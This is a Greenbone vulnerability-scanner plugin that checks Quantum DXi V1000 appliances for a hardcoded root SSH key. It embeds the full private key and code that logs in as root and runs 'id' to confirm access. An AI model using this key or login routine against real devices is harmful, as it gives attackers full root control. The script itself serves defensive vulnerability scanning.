# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804414");
  script_version("2023-07-26T05:05:09+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-03-19 11:54:59 +0530 (Wed, 19 Mar 2014)");
  script_name("Quantum DXi Remote 'root' Authentication Bypass Vulnerability");

  script_tag(name:"summary", value:"Quantum DXi is prone to an authentication bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Send a SSH Private Key and check whether it is possible to login to
  the target machine.");

  script_tag(name:"insight", value:"- The root user has a hardcoded password that is unknown and not changeable.
  Normally access is only through the restricted shells.

  - The /root/.ssh/authorized_keys on the appliance contains the static private
  ssh key. Using this key on a remote system to login through SSH will give a root shell.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to  gain unauthorized root
  access to affected devices and completely compromise the devices.");

  script_tag(name:"affected", value:"Quantum DXi V1000 2.2.1 and below.");

  script_tag(name:"solution", value:"Upgrade to Quantum DXi V1000 2.3.0.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125755");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/quantum-dxi-v1000-221-ssh-key-root-user");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Gain a shell remotely");
  script_dependencies("ssh_detect.nasl", "gb_default_credentials_options.nasl");
  script_require_ports("Services/ssh", 22);
  script_mandatory_keys("ssh/server_banner/available");
  script_exclude_keys("default_credentials/disable_default_account_checks");

  exit(0);
}

if(get_kb_item("default_credentials/disable_default_account_checks"))
  exit(0);

include("ssh_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ssh_get_port(default:22);

if(ssh_dont_try_login(port:port))
  exit(0);

if(!soc = open_sock_tcp(port))
  exit(0);

priv ='-----BEGIN DSA PRIVATE KEY-----
MIIBugIBAAKBgQCEgBNwgF+IbMU8NHUXNIMfJ0ONa91ZI/TphuixnilkZqcuwur2
hMbrqY8Yne+n3eGkuepQlBBKEZSd8xPd6qCvWnCOhBqhkBS7g2dH6jMkUl/opX/t
Rw6P00crq2oIMafR4/SzKWVW6RQEzJtPnfV7O3i5miY7jLKMDZTn/DRXRwIVALB2
+o4CRHpCG6IBqlD/2JW5HRQBAoGAaSzKOHYUnlpAoX7+ufViz37cUa1/x0fGDA/4
6mt0eD7FTNoOnUNdfdZx7oLXVe7mjHjqjif0EVnmDPlGME9GYMdi6r4FUozQ33Y5
PmUWPMd0phMRYutpihaExkjgl33AH7mp42qBfrHqZ2oi1HfkqCUoRmB6KkdkFosr
E0apJ5cCgYBLEgYmr9XCSqjENFDVQPFELYKT7Zs9J87PjPS1AP0qF1OoRGZ5mefK
6X/6VivPAUWmmmev/BuAs8M1HtfGeGGzMzDIiU/WZQ3bScLB1Ykrcjk7TOFD6xrn
k/inYAp5l29hjidoAONcXoHmUAMYOKqn63Q2AsDpExVcmfj99/BlpQIUYS6Hs70u
B3Upsx556K/iZPPnJZE=
-----END DSA PRIVATE KEY-----';

loginCheck = ssh_login(socket:soc, login:"root", password:NULL, priv:priv, passphrase:NULL );
if(loginCheck == 0 )
{
  cmd = ssh_cmd(socket:soc, cmd:"id" );

  if(ereg(pattern:"uid=[0-9]+.*gid=[0-9]+", string:cmd))
  {
    security_message(port:port);
    close(soc);
    exit(0);
  }
}

close(soc);
